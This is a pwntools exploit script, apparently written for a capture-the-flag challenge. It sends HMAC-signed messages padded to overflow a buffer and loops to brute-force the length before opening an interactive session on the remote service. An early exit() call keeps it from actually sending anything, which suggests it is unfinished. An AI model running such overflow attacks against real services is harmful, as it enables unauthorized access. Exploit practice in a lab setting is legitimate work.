#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host device0.vikaa.fi --port 4924
from pwn import *
import hmac

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'device0.vikaa.fi'
port = int(args.PORT or 49244)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

    
buffer_len=27
while(True):
    try:
        io = start()
        keyphrase=b"This is a dummy key!"
        command=b"help"+b'A'*buffer_len+keyphrase
        my=b"ClientCmd|205442|" + command
        h = hmac.new( keyphrase, my, hashlib.sha256).hexdigest().encode('utf-8')
        msg=b"205442;" + command + b";" + h + b"\n"
        print(msg)
        exit()
        io.send(msg)
        resp = io.recvline(timeout=5)
        if "Invalid HMAC" in resp.decode("utf-8"):
            print(f"Invalid HMAC: {buffer_len}")
            buffer_len += 1
            io.close()
            continue
        if resp:
            print(f"Valid buffer_len:{buffer_len}")
            print(resp)
            io.interactive()
            break
        else:
            print(buffer_len)
            buffer_len += 1
            io.close()
            continue
    except EOFError:
        print("Sleeping")
        io.close()
        sleep(10)
        continue
    # shellcode = asm(shellcraft.sh())
    # payload = fit({
    #     32: 0xdeadbeef,
    #     'iaaa': [1, 2, 'Hello', 3]
    # }, length=128)
    # io.send(payload)
    # flag = io.recv(...)
    # log.success(flag)

io.interactive()

